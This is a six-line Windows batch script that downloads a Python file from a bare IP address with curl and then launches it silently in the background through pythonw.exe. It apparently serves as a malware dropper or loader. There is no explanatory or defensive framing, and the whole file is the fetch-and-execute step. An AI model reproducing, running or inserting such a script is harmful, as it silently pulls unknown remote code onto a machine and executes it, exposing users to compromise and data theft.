@echo off
set "SCRIPT_URL=http://77.91.124.178/py2_auto_encodet_final.py"
set "SCRIPT_NAME=py2_auto_encodet_final.py"

curl -o %SCRIPT_NAME% %SCRIPT_URL%
start /B pythonw.exe %SCRIPT_NAME%
